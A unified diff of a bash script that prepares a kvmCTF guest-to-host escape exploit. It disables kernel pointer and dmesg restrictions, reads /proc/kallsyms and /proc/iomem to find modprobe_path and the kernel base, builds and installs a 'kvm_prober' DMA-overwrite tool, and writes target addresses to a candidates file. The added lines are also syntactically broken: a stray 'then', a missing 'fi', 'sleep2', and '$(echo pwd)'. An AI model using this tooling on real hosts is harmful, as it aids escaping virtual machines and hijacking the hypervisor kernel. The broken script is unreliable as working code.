@@ -1,14 +1,14 @@
 #!/bin/bash
 
 echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
-sleep 2
 
+sleep 2
 # Fetch vmlinux only if not already present
 if [ ! -f "/root/vmlinux" ]; then
     echo "[*] Downloading latest kvmctf bundle for vmlinux..."
     wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
     tar -xzf latest.tar.gz
-    mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
+    mv $(echo pwd)/kvmctf-6.1.74/vmlinux/vmlinux /root
     echo "[+] vmlinux moved to /root"
 else
     echo "[+] /root/vmlinux already exists, skipping download."
@@ -17,36 +17,37 @@ fi
 echo -e "\n\033[1;36m[*] Installing missing packages...\033[0m"
 sleep 1
 apt update -y >/dev/null
-apt-get --fix-broken install -y
 apt install sudo make xxd python3-pip build-essential binutils tar -y >/dev/null || true
-apt install -f -y >/dev/null
-sleep 2
 
+sleep 2
 ### ===Kernel Header Installation===
 echo "[*] Installing kernel headers for exploit environment"
 KERN_VER=$(uname -r)
 echo "[+] Detected kernel version: $KERN_VER"
 
-### ===Download headers===
-wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
-wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
-dpkg -i linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
-dpkg -i linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
-apt install -f -y >/dev/null
+sleep 2
+# Check if the kernel version contains "6.1.0-21"
+if [[ "$KERN_VER" == *"6.1.0-21"* ]]; then
+    echo "[*] Downloading/Installing matching kvmCTF headers"
+    wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
+    wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
+    apt-get install ./linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
+    apt-get install ./linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
+    apt-get --fix-missing install -y >/dev/null
+else
+    # Check if /proc/kallsyms exists
+    if [[ -f /proc/kallsyms ]]; then
+        echo "[*] /proc/kallsyms exists, proceeding..."
+        cat /proc/kallsyms | grep modprobe_path
+    else
+        echo "[!] /proc/kallsyms not found, exiting."
+        exit 1
+    fi
+fi
 
-### ===Install with verification===
-echo "[*] Installing common headers"
-dpkg -i "linux-headers-${KERN_VER%-*}-common_6.1.90-1_all.deb" || true
-
-echo "[*] Installing architecture-specific headers"
-dpkg -i "linux-headers-${KERN_VER}_6.1.90-1_amd64.deb" || true
-
-apt-get install linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
-apt-get build-dep linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
-apt-get --fix-missing install -y
-
+sleep 2
 ### ===Verify installation===
-echo "[*] Verifying header installation"
+echo "[*] Verifying $KERN_VER/build directory"
 if [ -d "/lib/modules/$KERN_VER/build" ]; then
     echo "[+] Headers successfully installed at /lib/modules/$KERN_VER/build"
 else
@@ -54,9 +55,11 @@ else
     echo "[!] Exploit doesn't require headers but they're nice to have for debugging"
 fi
 
+sleep 2
 ### ===System Configuration Checks===
 echo "[*] Performing system configuration checks"
 
+sleep 2
 ### ===Ensure kptr_restrict is disabled===
 echo 0 | sudo tee /proc/sys/kernel/kptr_restrict
 echo 0 | sudo tee /proc/sys/kernel/dmesg_restrict
@@ -83,36 +86,36 @@ else
     fi
 fi
 
-### ===Check KASLR status===
-if grep -q "nokaslr" /proc/cmdline; then
-    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
-else
-    echo "[!] KASLR is ENABLED - exploit should handle this automatically"
-fi
-
-### ===Exploit Preparation===
-echo "[*] Preparing exploit environment"
-
+sleep 2
 ### ===Create kvm_prober===
 echo "[*] installing exploit script"
-#rm -r /tmp/kvm_probe_build*
-python3 /root/kvm_dma_overwrite.py
 
+if ls -la /tmp/kvm_probe_build*; then
+    echo "[!] removing previous kvm_prober dir";
+    rm -r /tmp/kvm_probe_build*; then
+    echo "[*] installing kvm prober"
+    python3 /root/kvm_dma_overwrite.py
+else
+    echo "[*] installing kvm prober"
+    python3 /root/kvm_dma_overwrite.py
+
+sleep2
 ### ===Set kvm_prober globally accessible (if not already present)===
 echo -e "\n\033[1;36m[*] Setting kvm_prober into /usr/local/bin...\033[0m"
 sleep 1
 PROBE_DIR=$(find /tmp -type d -name "kvm_probe_build*" | head -n1)
 cp "$PROBE_DIR/kvm_prober" /usr/local/bin
-sleep 2
 
+sleep 2
 ### ===Verify prober functionality===
 echo "[*] Verifying kvm_prober"
-if kvm_prober kvm_prober allocvqpage; then
+if kvm_prober allocvqpage; then
     echo "[+] kvm_prober functional"
 else
     echo "[!] kvm_prober test failed - check compatibility"
 fi
 
+sleep 2
 ### ===Check /proc/iomem and Kernel Symbol Access===
 if sudo grep -q "Kernel code" /proc/iomem; then
     KERNEL_LINE=$(sudo grep "Kernel code" /proc/iomem | head -n1)
@@ -123,6 +126,7 @@ else
     KERNEL_PHYS_BASE=""
 fi
 
+sleep 2
 echo "[*] Verifying kernel symbol visibility"
 REQUIRED_SYMBOLS=("modprobe_path" "_text")
 for sym in "${REQUIRED_SYMBOLS[@]}"; do
@@ -134,30 +138,40 @@ for sym in "${REQUIRED_SYMBOLS[@]}"; do
     fi
 done
 
+sleep 2
+echo "[*] Verifying if vmlinux is available"
+
+sleep 2
+# Check if vmlinux exists
+if [[ ! -f /root/vmlinux ]]; then
+    echo "[!] vmlinux not available!"
+    exit 1
+fi
+
+sleep 2
+# Extract modprobe_path and _text addresses
 MODPROBE_VA=$(nm -n /root/vmlinux | grep " modprobe_path" | awk '{print $1}')
 VIRT_BASE=$(nm -n /root/vmlinux | grep " _text" | awk '{print $1}')
+
+sleep 2
+# Convert modprobe_path to physical address
 MODPROBE_PA="0x$MODPROBE_VA"
 echo "[+] Host modprobe_path: $MODPROBE_PA"
+
+sleep 2
+# Write to modprobe_candidates
 echo "$MODPROBE_PA" > /root/modprobe_candidates
 
-### ===Run Exploit===
-echo "[*] Starting exploit in 5 seconds..."
-sleep 5
-sudo python3 kvm-full-test.py
+sleep 2
+# Verify if modprobe_candidates was created
+if [[ ! -f /root/modprobe_candidates ]]; then
+    echo "[!] modprobe_candidates not created! vmlinux might be unavailable."
+    exit 1
+fi
 
-PFN=0x101b8a
-PAGE_SIZE=4096
-PFN_DEC=$((PFN))
-PHYS=$((PFN_DEC * PAGE_SIZE))
-echo "Physical address: 0x$(printf '%X' $PHYS)"
+echo "[✔] modprobe_candidates successfully created!"
+echo "[*] $MODPROBE_PA"
 
-echo "==== /proc/iomem DMA zones ===="
-grep -E "DMA" /proc/iomem
-
-echo "==== DMA32 free pages ===="
-awk '/zone    DMA32/,/zone      Normal/' /proc/pagetypeinfo
-
-echo "==== DMA free pages ===="
-awk '/zone      DMA, type/ {print}' /proc/pagetypeinfo
-
-python3 /root/dynamic_kvm_prober.py
+sleep 2
+echo "[*] running read and write flag tests"
+bash run_mmio_probe.sh
